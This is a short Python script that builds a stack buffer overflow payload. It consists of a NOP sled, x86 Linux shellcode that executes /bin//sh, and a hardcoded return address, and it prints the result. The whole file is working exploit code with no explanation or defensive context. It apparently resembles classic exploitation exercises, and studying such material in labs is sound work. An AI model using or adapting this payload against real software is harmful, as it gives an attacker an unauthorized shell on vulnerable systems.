import struct

# Address where shellcode will be placed (adjust based on stack)
ret_addr = struct.pack("<I", 0xbffff7a0)

# NOP sled and shellcode
payload = b"\x90" * 100
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload += ret_addr
print(payload.decode('latin1'))